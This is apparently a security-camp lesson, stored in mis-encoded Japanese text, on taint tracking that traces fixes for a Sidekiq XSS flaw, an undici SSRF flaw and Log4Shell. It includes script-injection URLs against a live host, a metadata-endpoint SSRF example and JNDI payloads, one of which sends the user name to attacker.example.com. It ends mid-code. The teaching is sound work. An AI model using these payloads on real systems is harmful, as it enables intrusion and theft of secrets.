å¤–éƒ¨ã‹ã‚‰é€ä¿¡ã•ã‚Œã‚‹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ã‚½ãƒ¼ã‚¹(source)ğŸš°ã¨å‘¼ã¶ã€‚
- `req.query["foobar"]` 
- `$_POST["foobar"]` 
- ...

å¤–éƒ¨å…¥åŠ›å€¤ãŒå…¥ã‚‹ã¨è„†å¼±æ€§ã¨ãªã‚Šã†ã‚‹ç®‡æ‰€ã‚’ã‚·ãƒ³ã‚¯(sink)ğŸª£ã¨å‘¼ã¶ã€‚
- `process.execSync(...)` 
- `db.query(...)`
- ...

ã‚½ãƒ¼ã‚¹ğŸš°ã‹ã‚‰é–‹å§‹ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ãŒæµã‚Œã‚‹å ´æ‰€ã‚’Taint(æ±šæŸ“)ã•ã‚ŒãŸãƒã‚¤ãƒ³ãƒˆã¨ã¿ãªã—ã€ã‚³ãƒ¼ãƒ‰ã®å‡¦ç†ã‚’è¿½ã„ãªãŒã‚‰æœ€çµ‚çš„ã«æ±šæŸ“ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ãŒã‚·ãƒ³ã‚¯ğŸª£ã«è¾¿ã‚Šç€ãã‹æ¢ã—ã¦ã„ãã€‚
ã–ã£ãã‚Šè¨€ã†ã¨ã‚½ãƒ¼ã‚¹ğŸš° -> ã‚·ãƒ³ã‚¯ğŸª£ã¨ãªã‚‹æµã‚Œï¼ˆData flowï¼‰ã‚’æ¢ã—ã¦ã„ãæ„Ÿã˜ã€‚

```javascript
// 1. username` ãŒæ±šæŸ“ã•ã‚Œã‚‹
const username = req.query["username"]

// 2. `date` ã¯å¤–éƒ¨ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ã¯ãªã„ã®ã§æ±šæŸ“ã•ã‚Œã¦ã„ãªã„
const date = new Date()

// 3. `query` ãŒæ±šæŸ“ã•ã‚Œã‚‹
const query = `SELECT * FROM users WHERE username = '${username}'`

// 4. æ±šæŸ“ã•ã‚ŒãŸ `query` ãŒ `db.query` ã«å…¥ã‚‹ã®ã§SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒèµ·ãã‚‹ï¼
db.query(query)
```

source
ğŸš° `ğŸ„req.query["username"]`  ->
ğŸ’§ `username = ğŸ„req.query["username"]` ->
ğŸ’§ ``query = `SELECT ... ${ğŸ„username}` `` ->
ğŸª£ `db.query(ğŸ„query)` 
sink

#### é€†å‘ãTaint Tracking

ã‚·ãƒ³ã‚¯ğŸª£ã‹ã‚‰ã‚½ãƒ¼ã‚¹ğŸš°ã‚’æ¢ã™ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚
æ˜ã‚‰ã‹ã«æ€ªã—ã„é–¢æ•°(evalã¨ã‹)ã‚’æ¤œç´¢ã—ã¦ã€ãã®ã‚³ãƒ¼ãƒ‰ãƒ–ãƒ­ãƒƒã‚¯ã®å‘¼ã³å‡ºã—å…ƒã€å½±éŸ¿ã—ãŸå¤‰æ•°ãªã©ã‚’è¾¿ã£ã¦ã„ãã€‚

ã‚·ãƒ³ã‚¯ğŸª£ã‹ã‚‰è¾¿ã£ãŸæ–¹ãŒåŠ¹ç‡çš„ãªå ´åˆã‚‚ã‚ã‚Œã°ã€ãã†ã§ãªã„å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚
(é–¢ä¿‚ã™ã‚‹å¤‰æ•°ãŒå¤šæ•°ã‚ã‚‹ã€ç‰¹æ®Šãªå‘¼ã°ã‚Œæ–¹ã‚’ã—ã¦ã„ã¦å‘¼ã³å‡ºã—å…ƒãŒåˆ†ã‹ã‚Šã¥ã‚‰ã„å ´åˆã¨ã‹)

å€‹äººçš„ã«ã¯ã‚·ãƒ³ã‚¯ğŸª£ã«è‡³ã‚‹ãƒ•ãƒ­ãƒ¼ã‚’ã„ãã¤ã‹æŠŠæ¡ã—ã¦ãŠã„ã¦ã€ã‚½ãƒ¼ã‚¹ğŸš°ã‹ã‚‰æ¢ç´¢ã‚’è¡Œã†ã€ã¨ã„ã£ãŸã‚„ã‚Šæ–¹ã‚’ã™ã‚‹ã“ã¨ãŒå¤šã„ã‹ã‚‚ï¼Ÿ

# CVEã‹ã‚‰è„†å¼±æ€§ã®è©³ç´°ã‚’èª¿æŸ»ã—ã¦ã¿ã‚ˆã†

## (Ruby) CVE-2023-1892

Sidekiqã®è„†å¼±æ€§ ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°
Sidekiqã¯ãƒãƒƒã‚¯ã‚°ãƒ©ãƒ³ãƒ‰ã§éåŒæœŸã‚¸ãƒ§ãƒ–ã‚’å‡¦ç†ã™ã‚‹ãŸã‚ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯
Webãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰æ©Ÿèƒ½ãŒã‚ã‚Šã€Webã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã‚¸ãƒ§ãƒ–ã®ãƒ¢ãƒ‹ã‚¿ãƒ¼ã€ç®¡ç†ç­‰ãŒã§ãã‚‹

![](https://tyage.github.io/seccamp-2023-images/upload_35c024dea5e019addc585e56baf435ab.png)


ç”»é¢ç¢ºèªç”¨(è¨ºæ–­ãƒ„ãƒ¼ãƒ«ç­‰ã¯å®Ÿè¡Œã—ãªã„ã§ãã ã•ã„)
http://ec2-43-207-225-198.ap-northeast-1.compute.amazonaws.com:3000/sidekiq

### èª²é¡Œ1: CVE-2023-1892ã®èª¿æŸ»
ã“ã®èª¿æŸ»ã§ã‚„ã‚‹ã“ã¨
* ã©ã®ã‚ˆã†ã«ä¿®æ­£ã•ã‚ŒãŸã‹èª¿æŸ»ã™ã‚‹
* ã‚½ãƒ¼ã‚¹ã¨ã‚·ãƒ³ã‚¯ã«ã¤ã„ã¦ç‰¹å®šã™ã‚‹

https://nvd.nist.gov/vuln/detail/CVE-2023-1892

(èª¿æŸ»æ™‚é–“: 10åˆ†)
ï¼ˆChatGPTä½¿ã†ã®ã‚‚å¯ï¼‰

<details>
<summary>!!Spoiler Alert!!</summary>

![](https://tyage.github.io/seccamp-2023-images/upload_7d8eb70b755b4718704f269eb4963584.png)

GitHubã®ãƒªãƒ³ã‚¯ã¨huntr.devã®ãƒªãƒ³ã‚¯ãŒã‚ã‚‹
https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214
https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777/

ã¾ãšã¯GitHubã‹ã‚‰

```ruby
    get "/metrics" do
       q = Sidekiq::Metrics::Query.new
       @period = params[:period]
       @periods = METRICS_PERIODS 
```

ã“ã‚ŒãŒä»¥ä¸‹ã«ä¿®æ­£ã•ã‚Œã¦ã„ã‚‹

```ruby
    get "/metrics" do
       q = Sidekiq::Metrics::Query.new
       @period = h((params[:period] || "")[0..1])
       @periods = METRICS_PERIODS
```

ã€Œhã€ã«ã‚ˆã£ã¦HTMLã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹ã“ã¨ã§ä¿®æ­£ã‚’è¡Œãªã£ã¦ã„ã‚‹
â†’ ã¨ã„ã†ã“ã¨ã¯ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã€Œparams[:period]ã€ãŒã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ã®åŸå› ï¼Ÿ

ä¿®æ­£å‰ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯7.07
https://github.com/sidekiq/sidekiq/blob/v7.0.7/lib/sidekiq/web/application.rb

å‡ºåŠ›ç®‡æ‰€
https://github.com/sidekiq/sidekiq/blob/v7.0.7/web/views/metrics.erb#L65C22-L65C22

```erb
                  <%= visible_kls.include?(kls) ? 'checked' : '' %>
                />
                <code><a href="<%= root_path %>metrics/<%= kls %>?period=<%= @period %>"><%= kls %></a></code>
              </div>
              <script>jobMetricsChart.registerSwatch("<%= id %>")</script>
```

https://github.com/sidekiq/sidekiq/blob/v7.0.7/web/views/metrics_for_job.erb#L20

```erb
  <div class="header-container">
    <div class="page-title-container">
      <h1>
        <a href="<%= root_path %>metrics?period=<%= @period %>"><%= t('Metrics') %></a> /
        <%= h @name %>
      </h1>
```
            
`/metrics`ã¾ãŸã¯`/metrics/:name`ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã€Œperiodã€ã«å¯¾ã—ã¦JavaScriptã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ãªHTMLã‚¿ã‚°ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã§ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ãŒç™ºç”Ÿã™ã‚‹ã“ã¨ãŒã‚ã‹ã£ãŸ

http://ec2-43-207-225-198.ap-northeast-1.compute.amazonaws.com:3000/sidekiq/metrics?period=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
            
http://ec2-43-207-225-198.ap-northeast-1.compute.amazonaws.com:3000/sidekiq/metrics/SampleJob?period=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
            
</details>


## (JavaScript) CVE-2022-35949

undiciã®è„†å¼±æ€§ SSRF

https://nvd.nist.gov/vuln/detail/CVE-2022-35949


### èª²é¡Œ2: CVE-2022-35949ã®èª¿æŸ»
èª¿æŸ»ã‚¿ã‚¹ã‚¯: 
- undiciãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ã©ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚½ãƒ¼ã‚¹ğŸš°ã§ã—ã‚‡ã†ã‹
- ã©ã†ã„ã£ãŸæ”»æ’ƒãŒæƒ³å®šã§ãã¾ã™ã‹ï¼Ÿ

(èª¿æŸ»æ™‚é–“: 10åˆ†)

<details>
<summary>!!Spoiler Alert!!</summary>

ä¿®æ­£ã‚³ãƒŸãƒƒãƒˆ
https://github.com/nodejs/undici/commit/124f7ebf705366b2e1844dff721928d270f87895

```javascript
url = new URL(opts.path, util.parseOrigin(url))
```
â†“ä¿®æ­£å¾Œ
```javascript
let path = opts.path
if (!opts.path.startsWith('/')) {
  path = `/${path}`
}

url = new URL(util.parseOrigin(url).origin + path)
```

:thinking_face: 

URLã®ç¬¬ä¸€å¼•æ•°ã«path, ç¬¬äºŒå¼•æ•°ã«originã‚’æ¸¡ã™å½¢å¼ã‹ã‚‰ã€æ–‡å­—åˆ—çµåˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ã«ãªã£ã¦ã„ã‚‹ã€‚

ã‚³ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€ `new URL(path, origin)` ã¯ `path` ãŒçµ¶å¯¾URLã®æ™‚ã« `origin` ãŒç„¡è¦–ã•ã‚Œã‚‹...ã‚‰ã—ã„ã€‚
https://developer.mozilla.org/en-US/docs/Web/API/URL/URL

```javascript
    // new URL(path, origin) is unsafe when `path` contains an absolute URL
     // From https://developer.mozilla.org/en-US/docs/Web/API/URL/URL:
     // If first parameter is a relative URL, second param is required, and will be used as the base URL.
     // If first parameter is an absolute URL, a given second param will be ignored.
```

ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’è©¦ã—ã¦ã¿ã‚‹ã¨ã€originã‚’æŒ‡å®šã—ã¦ã„ã‚‹ã®ã«ç¢ºã‹ã«ç„¡è¦–ã•ã‚Œã¾ã™ã­ï¼

```javascript
console.log(new URL('//localhost:9999', 'http://localhost:3000')) // => http://localhost:9999
```

diffã«ã¯ãƒ†ã‚¹ãƒˆã‚³ãƒ¼ãƒ‰ã‚‚è¿½åŠ ã•ã‚Œã¦ã„ã¾ã™ã€‚

```javascript
 test('protocol-relative URL as pathname should be included in req.path', async (t) => {
   const pathServer = createServer((req, res) => {
     t.fail('it shouldn\'t be called')
     res.statusCode = 200
     res.end('hello')
   })

   const requestedServer = createServer((req, res) => {
     t.equal(`//localhost:${pathServer.address().port}`, req.url)
     t.equal('GET', req.method)
     t.equal(`localhost:${requestedServer.address().port}`, req.headers.host)
     res.statusCode = 200
     res.end('hello')
   })

   t.teardown(requestedServer.close.bind(requestedServer))
   t.teardown(pathServer.close.bind(pathServer))

   await Promise.all([
     requestedServer.listen(0),
     pathServer.listen(0)
   ])

   const noSlashPathname = await request({
     method: 'GET',
     origin: `http://localhost:${requestedServer.address().port}`,
     pathname: `//localhost:${pathServer.address().port}`
   })
   t.equal(noSlashPathname.statusCode, 200)
```

ã©ã†ã‚„ã‚‰ã“ã®è„†å¼±æ€§ã«ã¯ `path` ã‚„ `origin` ã€ãã—ã¦ `new URL` ã®ä»•æ§˜ãŒé–¢ä¿‚ã—ã¦ã„ãã†ã§ã™ã€‚

undiciã¯ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãªã®ã§ã€ã©ã†å‘¼ã³å‡ºã•ã‚Œã‚‹ã‹ã‚‚è¦‹ã¦ã¿ã‚ˆã†ã€‚

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://undici.nodejs.org/) ã‚’è¦‹ã‚‹ã¨ã“ã†ã„ã†ä½¿ã„æ–¹ã‚’ã™ã‚‹ã¿ãŸã„ã§ã™ã€‚
    
```javascript
import { request } from 'undici'

await request('http://localhost:3000/foo')
```

undiciã®requestç¬¬ä¸€å¼•æ•°ã«ã¯ `UrlObject` ãŒæŒ‡å®šã§ãã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚
https://undici.nodejs.org/#/?id=undicirequesturl-options-promise

å…ˆç¨‹ã®ãƒ†ã‚¹ãƒˆã‚³ãƒ¼ãƒ‰ã¯ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã­ã€‚

```javascript
   const noSlashPathname = await request({
     method: 'GET',
     origin: `http://localhost:${requestedServer.address().port}`,
     pathname: `//localhost:${pathServer.address().port}`
   })
```

`request({ origin: 'http://localhost:3000', pathname: '//localhost:9999' })`
ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ãŒä¿®æ­£å‰ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§å®Ÿè¡Œã•ã‚ŒãŸå ´åˆã‚’è€ƒãˆã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ä¿®æ­£å‰ã®ã‚³ãƒ¼ãƒ‰ã‚’è¿½ã£ã¦ã„ãã¨ [lib/core/util.jsã®118è¡Œç›®](https://github.com/nodejs/undici/commit/124f7ebf705366b2e1844dff721928d270f87895#diff-e0a4e92ad66667607d700021123bf26260711f87fda60b44f6867a3f22087410L118) ã§ `new URL('//localhost:9999', 'http://localhost:3000')` ãŒå®Ÿè¡Œã•ã‚Œãã†ã§ã™ã€‚

ã‚³ãƒ¡ãƒ³ãƒˆã«ã‚ã£ãŸ `new URL` ã®ä»•æ§˜ã‹ã‚‰ã€ã“ã‚Œã ã¨ç¬¬äºŒå¼•æ•°ãŒç„¡è¦–ã•ã‚Œã¦ `http://localhost:9999` ãŒè¿”ã£ã¦ã—ã¾ã„ã¾ã™ã€‚

æœ¬æ¥ã§ã‚ã‚Œã° `http://localhost:3000//localhost:9999` ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¦ã„ã¦æ¬²ã—ã„ã¨ã“ã‚ã€ãƒã‚°ã«ã‚ˆã£ã¦ `http:///localhost:9999` ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé£›ã‚“ã§ã—ã¾ã„ãã†ã§ã™ã€‚

ã©ã†ã‚„ã‚‰ã“ã‚ŒãŒSSRFã®è„†å¼±æ€§ã«ç¹‹ãŒã£ã¦ã„ã‚‹ã¿ãŸã„ã§ã™ï¼
å®Ÿéš›ã©ã†ã„ã†è¢«å®³ãŒç™ºç”Ÿã—ã†ã‚‹ã‹ã«ã¤ã„ã¦ã‚‚å°‘ã—è€ƒãˆã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ä¾‹ãˆã°éƒµä¾¿ç•ªå·ã‹ã‚‰ä½æ‰€ã‚’æ¤œç´¢ã™ã‚‹APIã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã«ã€undiciã‚’åˆ©ç”¨ã—ã¦ä»¥ä¸‹ã®ã‚ˆã†ãªå®Ÿè£…ã—ãŸã¨ã—ã¾ã™ã€‚

```javascript
// ä½æ‰€æ¤œç´¢APIã‚µãƒ¼ãƒ“ã‚¹ã‚’åˆ©ç”¨ã™ã‚‹
// ä¾‹: http://juushokensaku.api/101-0001
function search(req, res) {
    const result = request({
        origin: 'http://juushokensaku.api',
        path: req.params.yuubinbango
    }, headers: {
        'Authorization': `Bearer ${apiToken}`
    })
}
```

ã“ã®å ´åˆã€ `req.params.yubinbango` ã¯ãƒ¦ãƒ¼ã‚¶ãŒå…¥åŠ›ã—ãŸå€¤ã§ã€é€šå¸¸ã¯ `101-0001` ã®ã‚ˆã†ãªéƒµä¾¿ç•ªå·ãŒå…¥ã‚‹ã¨æƒ³å®šã•ã‚Œã¾ã™ã€‚
ã‚‚ã—ã“ã®å€¤ãŒSSRFã§ã‚ˆãé »å‡ºã™ã‚‹ `http://169.254.169.254/latest/api/token` ã®ã‚ˆã†ãªURLã ã¨ã€ã‚µãƒ¼ãƒå†…éƒ¨ã‹ã‚‰ã—ã‹æœ¬æ¥ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„å ´æ‰€ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¦ã—ã¾ã„ã¾ã™ã€‚

ãã‚Œä»¥å¤–ã«ã‚‚ã€ `https://seccamp-hacker.site/` ã®ã‚ˆã†ãªURLãŒå…¥ã£ã¦ã„ã‚‹ã¨ã€HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒ `seccamp-hacker.site` ã«é€ä¿¡ã•ã‚Œã¦ã—ã¾ã„ã¾ã™ã€‚
ãƒªã‚¯ã‚¨ã‚¹ãƒˆã® `Authorization` ãƒ˜ãƒƒãƒ€ã«ã¯ `apiToken` ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã®ã§ã€ã“ã‚ŒãŒç›—ã¾ã‚Œã¦ã—ã¾ã„ãã†ã§ã™ã€‚

ã“ã®ã‚ˆã†ã«ä¿®æ­£ã‚³ãƒŸãƒƒãƒˆã ã‘ã§ãªãã€ãƒ†ã‚¹ãƒˆã‚³ãƒ¼ãƒ‰ã‚‚å‚è€ƒã«ãªã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
ã¾ãŸã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®è„†å¼±æ€§ã®å ´åˆã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒã©ã†ã„ã£ãŸä½¿ã„æ–¹ã‚’ã•ã‚Œã¦ã„ã‚‹ã‹æƒ³åƒã™ã‚‹ã“ã¨ã‚‚é‡è¦ã§ã™ã­ã€‚

</details>


## (Java) Log4shell
### Log4shellã¨ã¯
Javaã§æœ€ã‚‚ãƒãƒ”ãƒ¥ãƒ©ãƒ¼ãªãƒ­ã‚°ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ä¸€ã¤ã§ã‚ã‚‹Log4jã§ç™ºè¦‹ã•ã‚ŒãŸJNDIã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹ä»»æ„ã‚³ãƒ¼ãƒ‰å®Ÿè¡ŒãŒå¯èƒ½ãªè„†å¼±æ€§ã€‚
ãƒ­ã‚°ã¨ã—ã¦å‡ºåŠ›ã™ã‚‹ãƒ‡ãƒ¼ã‚¿å†…ã«ãƒ¦ãƒ¼ã‚¶ã®å…¥åŠ›å€¤ãŒå«ã¾ã‚Œã‚‹å ´åˆã«ç™ºç”Ÿã—ã€æ”»æ’ƒã®å®¹æ˜“ã•ã¨Amazon AWSã€Cloudflareã€iCloudã€Javaãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®Minecraftã€Steamãªã©å½±éŸ¿ç¯„å›²ãŒç›¸å½“ãªã‚‚ã®ã§ã‚ã£ãŸã“ã¨ã§æœ‰åã€‚


### log4j2ã®åˆ©ç”¨æ–¹æ³•
```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Test {
    
  private static final Logger logger = LogManager.getLogger(Test.class);
    
  public static void main(String[] args) {
    logger.info("LOG TEST"); 
  }
}
```

å‡ºåŠ›çµæœ
```
[2023-08-05 23:49:04.984], INFO , main, org.example.Test, LOG TEST
```


### JNDIã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ä¾‹
context.lookupï¼ˆï¼‰ç­‰ã®å¼•æ•°ã«ãƒ¦ãƒ¼ã‚¶å…¥åŠ›å€¤ãŒãã®ã¾ã¾å…¥ã‚‹ã¨å¤–éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰Javaã‚¯ãƒ©ã‚¹ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãä»»æ„ã‚³ãƒ¼ãƒ‰å®Ÿè¡ŒãŒã§ãã‚‹

JNDIã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®exploitã«ã¤ã„ã¦ã¯ä»¥ä¸‹ã‚‚å‚è€ƒ
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf

```Java
import javax.naming.InitialContext
import javax.naming.NamingException;


public class Test {
        
  public static void main(String[] args) throws NamingException {
    InitialContext context = new InitialContext();
    context.lookup("ldap://{HOST}/ExploitObject.class")
  }
}
```


Log4shellã®è„†å¼±æ€§ãŒç™ºç”Ÿã™ã‚‹å®Ÿè£…ä¾‹
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Test {
    
  private static final Logger logger = LogManager.getLogger(Test.class);
    
  public static void main(String[] args) {
    logger.info("${jndi:ldap://127.0.0.1/a}");
    logger.info("${jndi:dns://${env:USER}.attacker.example.com/a}"); // <JVMå®Ÿè¡Œãƒ¦ãƒ¼ã‚¶>.attacker.example.comã«DNSã‚¯ã‚¨ãƒªãŒç™ºç”Ÿã™ã‚‹

  }
}
```

### èª²é¡Œ3: CVE-2021-44228ã®èª¿æŸ»
ã“ã®èª¿æŸ»ã§ã‚„ã‚‹ã“ã¨
* ã‚½ãƒ¼ã‚¹ã¨ã‚·ãƒ³ã‚¯ã«ã¤ã„ã¦ç‰¹å®šã™ã‚‹

### CVE-2021-44228
https://github.com/apache/logging-log4j2/commit/6cfd08511c822f7f28f6723042d2c697f90e0fb8


ä»¥ä¸‹ã®ä¿®æ­£ã‚³ãƒŸãƒƒãƒˆã‹ã‚‰å½“ãŸã‚Šã‚’ã¤ã‘ã¦ã‚·ãƒ³ã‚¯ã‚’èª¿æŸ»ã—ã¦ã¿ã‚ˆã†(10åˆ†)
â€»äº‹å‰ã«é™çš„è§£æç’°å¢ƒã‚’æ•´ãˆã¦ã„ã‚‹ã‹ã€å‹•çš„è§£æã—ãªã„ã¨é›£ã—ã„ã¨æ€ã†ã®ã§ã§ããªãã¦ã‚‚å¤§ä¸ˆå¤«
å¾Œã®ãƒ‘ãƒ¼ãƒˆã§CodeQLã‚¯ã‚¨ãƒªã‚’ä½œæˆã™ã‚‹ã®ã§ã€ãã“ã§èª­ã‚“ã§ã„ãäºˆå®šã§ã™

https://github.com/apache/logging-log4j2/pull/608/commits
LDAPã‚¹ã‚­ãƒ¼ãƒ ã‚„é€šä¿¡å…ˆã®ãƒ›ã‚¹ãƒˆæ¤œè¨¼ã‚’è¡Œã†ä¿®æ­£

Log4j 2.14.1 ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ 
https://github.com/apache/logging-log4j2/tree/rel/2.14.1

![](https://tyage.github.io/seccamp-2023-images/upload_d3935cc17511f9e6699ead619d23bc84.png)

`new InitialContext(data)`ã‚’new JndiManager()ã®å¼•æ•°ã«æ¸¡ã—ã¦ã„ã‚‹ç®‡æ‰€ãŒã‚ã‚Šã€ã“ã®ä»˜è¿‘ãŒæ€ªã—ãã†
![](https://tyage.github.io/seccamp-2023-images/upload_2a172929f84f4d3bd8ed68a818da91cf.png)

ã“ã“ã‹ã‚‰ã¯ä¿®æ­£å‰ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆ2.14.1ï¼‰ã®ã‚³ãƒ¼ãƒ‰ã‚’è¿½ã£ã¦ã„ã

ã¾ãšã¯ä¿®æ­£ã‚³ãƒŸãƒƒãƒˆã®ç®‡æ‰€ã§ã‚ã‚‹createManager()
new JndiManagerã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¨ã—ã¦InitialContextãŒæ¸¡ã•ã‚Œã‚‹
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L180
```java
        @Override
        public JndiManager createManager(final String name, final Properties data) {
            try {
                return new JndiManager(name, new InitialContext(data));
            } catch (final NamingException e) {
                LOGGER.error("Error creating JNDI InitialContext.", e);
                return null;
            }
        }
    }
```

```java
public class JndiManager extends AbstractManager {
    ... 
    private JndiManager(final String name, final Context context) {
        super(null, name);
        this.context = context;
    }
```


https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/appender/AbstractManager.java#L113
```java
    public static <M extends AbstractManager, T> M getManager(final String name, final ManagerFactory<M, T> factory,
                                                              final T data) {
        LOCK.lock();
        try {
            @SuppressWarnings("unchecked")
            M manager = (M) MAP.get(name);
            if (manager == null) {
                manager = factory.createManager(name, data); // ã“ã“ã§å‘¼ã³å‡ºã•ã‚Œã‚‹
                if (manager == null) {
                    throw new IllegalStateException("ManagerFactory [" + factory + "] unable to create manager for ["
                            + name + "] with data [" + data + "]");
                }
                MAP.put(name, manager);
            } else {
                manager.updateData(data);
            }
            manager.count++;
            return manager;
        } finally {
            LOCK.unlock();
        }
    }
```

https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java
```java
    public static JndiManager getDefaultManager() {
        return getManager(JndiManager.class.getName(), FACTORY, null);
    }
```

ã“ã“ã§ã€JndiManagerã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å–å¾—ã—ã€jndiManager.lookup(jndiName)ã‚’å‘¼ã³å‡ºã—ã¦ã„ã‚‹

https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java#L56
```java
    @Override
    public String lookup(final LogEvent event, final String key) {
        if (key == null) {
            return null;
        }
        final String jndiName = convertJndiName(key);
        try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
            return Objects.toString(jndiManager.lookup(jndiName), null);
        } catch (final NamingException e) {
            LOGGER.warn(LOOKUP, "Error looking up JNDI resource [{}].", jndiName, e);
            return null;
        }
    }
```


ã“ã“ãŒsinkï¼ˆè„†å¼±æ€§ã®ç™ºç”Ÿç®‡æ‰€ï¼‰ã«ãªã£ã¦ã„ã‚‹
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L172C31-L172C31
```java
    public <T> T lookup(final String name) throws NamingException {
        return (T) this.context.lookup(name);
    }
```

ã‚½ãƒ¼ã‚¹ã®è¿½è·¡ã‚’ç°¡å˜ã«è¡Œã†
JndiLookup.lookupã®å‘¼ã³å‡ºã—å…ƒã¯StrSubstitutorã‚¯ãƒ©ã‚¹å†…ã®resolveVariableãƒ¡ã‚½ãƒƒãƒ‰ã§å‘¼ã³å‡ºã—ã¦ã„ã‚‹ãŒã€ã“ã®ã‚¯ãƒ©ã‚¹ã§ã¯JNDIã§åˆ©ç”¨ã§ãã‚‹æ§‹æ–‡ã®è§£æã‚’è¡Œãªã£ã¦ã„ãŠã‚Šå‡¦ç†ãŒè‹¥å¹²è¤‡é›‘ãªã®ã§ã“ã®ä»˜è¿‘ã®èª¬æ˜ã¯å‰²æ„›
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.java

```java
    protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                     final int startPos, final int endPos) {
        final StrLookup resolver = getVariableResolver();
        if (resolver == null) {
            return null;
        }
        return resolver.lookup(event, variableName);
    }
```

æ¬¡ã«ã‚½ãƒ¼ã‚¹ã‹ã‚‰ç°¡å˜ã«è¿½ã£ã¦ã„ã
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java
```java
    @Override
    public void info(final CharSequence message) {
        logIfEnabled(FQCN, Level.INFO, null, message, null);
    }
```

```java
    public void logIfEnabled(final String fqcn, final Level level, final Marker marker, final CharSequence message,
            final Throwable throwable) {
        if (isEnabled(level, marker, message, throwable)) {
            logMessage(fqcn, level, marker, message, throwable);
        }
    }
```

```java
    protected void logMessage(final String fqcn, final Level level, final Marker marker, final CharSequence message,
